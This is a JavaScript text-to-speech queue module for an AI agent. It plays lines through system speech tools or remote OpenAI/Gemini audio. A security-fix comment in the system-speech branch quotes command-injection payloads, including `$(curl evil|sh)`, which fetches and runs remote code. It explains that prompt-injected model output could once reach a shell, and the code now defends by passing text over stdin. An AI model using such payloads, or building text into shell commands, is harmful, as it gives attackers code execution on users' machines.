import { spawn } from 'child_process';
import { promises as fs } from 'fs';
import os from 'os';
import path from 'path';
import { TTSConfig as gptTTSConfig } from '../models/gpt.js';
import { TTSConfig as geminiTTSConfig } from '../models/gemini.js';

let speakingQueue = []; // each item: {text, model, audioData, ready}
let isSpeaking = false;

/**
 * 队列泵的**唯一**入口。
 *
 * `processQueue()` 是自递归的（播完一句再调自己播下一句），而顶层的 `speak()` 是
 * **同步**函数 —— 所以这条链天生是 fire-and-forget，没法简单"改成 await"。
 *
 * ★ T32：因此必须**显式接住 rejection**：
 *   · 一次 unhandled rejection 会把整个 agent 进程带走；
 *   · 就算只失败这一句，漏了 catch 也会让 `isSpeaking` 永远卡在 true，
 *     **之后整个 TTS 队列永久静音**（日志里只有一条 unhandled rejection，最难查）。
 */
function continueQueue() {
    processQueue().catch((e) => console.error('[TTS] 队列异常（已隔离，不中断播放）：', e));
}

export function speak(text, speak_model) {
    const model = speak_model || 'system';

    const item = { text, model, audioData: null, ready: null };

    if (model === 'system') {
        // no preprocessing needed
        item.ready = Promise.resolve();
    } else {
    item.ready = fetchRemoteAudio(text, model)
        .then(data => { item.audioData = data; })
        .catch(err => { item.error = err; });
    }

    speakingQueue.push(item);
    if (!isSpeaking) continueQueue();
}

async function fetchRemoteAudio(txt, model) {
    function getModelUrl(prov) {
        if (prov === 'openai') return gptTTSConfig.baseUrl;
        if (prov === 'google') return geminiTTSConfig.baseUrl;
        return 'https://api.openai.com/v1';
    }

    let prov, mdl, voice, url;
    if (typeof model === 'string') {
        [prov, mdl, voice] = model.split('/');
        url = getModelUrl(prov);
    } else {
        prov = model.api;
        mdl = model.model;
        voice = model.voice;
        url = model.url || getModelUrl(prov);
    }

    if (prov === 'openai') {
        return gptTTSConfig.sendAudioRequest(txt, mdl, voice, url);
    } else if (prov === 'google') {
        return geminiTTSConfig.sendAudioRequest(txt, mdl, voice, url);
    }
    else {
        throw new Error(`TTS Provider ${prov} is not supported.`);
    }
}

async function processQueue() {
    isSpeaking = true;
    if (speakingQueue.length === 0) {
        isSpeaking = false;
        return;
    }
    const item = speakingQueue.shift();
    const { text: txt, model, audioData } = item;
    if (txt.trim() === '') {
        isSpeaking = false;
        continueQueue();
        return;
    }

    const isWin = process.platform === 'win32';
    const isMac = process.platform === 'darwin';

    // wait for preprocessing if needed
    try {
        await item.ready;
        if (item.error) throw item.error;
    } catch (err) {
        console.error('[TTS] preprocess error', err);
        isSpeaking = false;
        continueQueue();
        return;
    }

    if (model === 'system') {
        // ★ F-EXEC-201（2026-11-06）：**绝不再把文本拼进命令行**。
        // 原来这里是 `exec(cmd)`，cmd 由 txt 拼成（win 只转义单引号、mac/linux 只转义双引号），
        // 于是模型输出（可被提示注入）里的 `hi"; & echo PWNED & rem "` 或 `$(curl evil|sh)`
        // 会变成真正的命令。**转义黑名单永远漏**，所以改结构：argv 全是字面量，文本走 stdin。
        //
        // ⚠️ 两条复核席实测结论，别"顺手加固"错了方向（2026-11-06）：
        //   ① **不要**在这里加 `[Console]::InputEncoding = [Text.Encoding]::UTF8`。
        //      实测 Windows 下默认编码**本来就是对的**；加了那行**反而把中文念成乱码**。
        //      （改之前先在真机试一遍中文，别凭直觉。）
        //   ② `inspectChatText` **不是 shell 过滤器** —— 它只拦"以 / 开头的行"，
        //      对 `"` `$()` `&` `|` 完全不拦。将来任何"文本 → 外部进程"的实现都**不得依赖它**，
        //      必须像这里一样：参数走 argv 字面量、数据走 stdin。
        const file = isWin ? 'powershell' : isMac ? 'say' : 'espeak';
        const argv = isWin
            ? ['-NoProfile', '-NonInteractive', '-Command',
                'Add-Type -AssemblyName System.Speech; ' +
                '$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; ' +
                '$s.Rate = 2; ' +
                '$t = [Console]::In.ReadToEnd(); ' +   // 文本只从 stdin 进，绝不进命令行
                '$s.Speak($t); $s.Dispose()']
            : isMac
            ? []                                     // `say` 无参数 = 从 stdin 读
            : ['--stdin'];                           // espeak 显式从 stdin 读

        let finished = false;
        const done = () => {
            if (finished) return;                    // error 与 close 可能都触发，只推进一次
            finished = true;
            isSpeaking = false;
            continueQueue();
        };

        let child;
        try {
            child = spawn(file, argv, { stdio: ['pipe', 'ignore', 'ignore'], windowsHide: true });
        } catch (e) {
            console.error('TTS spawn failed', e);
            done();
            return;
        }
        child.on('error', (err) => { console.error('TTS error', err); done(); });
        child.on('close', () => done());
        if (child.stdin) {
            child.stdin.on('error', () => { /* EPIPE：子进程已退出，close 会推进队列 */ });
            child.stdin.end(String(txt));
        }

    } 
    else {
        // audioData was already fetched in speak()
        const audioData = item.audioData;

        if (!audioData) {
            console.error('[TTS] No audio data ready');
            isSpeaking = false;
            continueQueue();
            return;
        }

        try {
            if (isWin) {
                const tmpPath = path.join(os.tmpdir(), `tts_${Date.now()}.mp3`);
                await fs.writeFile(tmpPath, Buffer.from(audioData, 'base64'));

                const player = spawn('ffplay', ['-nodisp', '-autoexit', '-loglevel', 'quiet', tmpPath], {
                    stdio: 'ignore', windowsHide: true
                });
                player.on('error', async (err) => {
                    console.error('[TTS] ffplay error', err);
                    try { await fs.unlink(tmpPath); } catch {}
                    isSpeaking = false;
                    // ★ T32：这两个回调本来就是 async 的 → 直接 await 最直白
                    await processQueue();
                });
                player.on('exit', async () => {
                    try { await fs.unlink(tmpPath); } catch {}
                    isSpeaking = false;
                    await processQueue();
                });

            } else {
                const player = spawn('ffplay', ['-nodisp','-autoexit','pipe:0'], {
                    stdio: ['pipe','ignore','ignore']
                });
                player.stdin.write(Buffer.from(audioData, 'base64'));
                player.stdin.end();
                player.on('exit', () => {
                    isSpeaking = false;
                    continueQueue();
                });
            }
        } catch (e) {
            console.error('[TTS] Audio error', e);
            isSpeaking = false;
            continueQueue();
        }
    }
}
